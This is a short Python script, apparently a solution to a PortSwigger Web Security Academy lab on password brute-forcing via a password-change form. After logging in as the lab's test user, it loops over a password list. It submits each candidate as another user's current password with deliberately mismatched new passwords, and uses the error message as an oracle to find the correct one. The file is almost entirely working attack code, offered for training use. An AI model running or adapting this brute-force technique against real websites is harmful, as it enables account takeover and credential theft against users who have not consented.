# https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-brute-force-via-password-change

import requests

with open('passwords.txt', 'r') as f:
    passwords = f.read().splitlines()

url = 'https://....web-security-academy.net'
found_password = ''

s = requests.Session()

login_body = {
    'username': 'wiener',
    'password': 'peter'
}
r = s.post(url = url + '/login', data = login_body)
print(r.status_code)

for password in passwords:

    change_pw_body = {
        'username': 'carlos',
        'current-password': password,
        'new-password-1': 'a',
        'new-password-2': 'b'
    }
    r = s.post(url = url + '/my-account/change-password', data = change_pw_body)
    print(password)

    if 'Current password is incorrect' not in r.text:
        found_password = password
        break

print('Password: ', found_password)
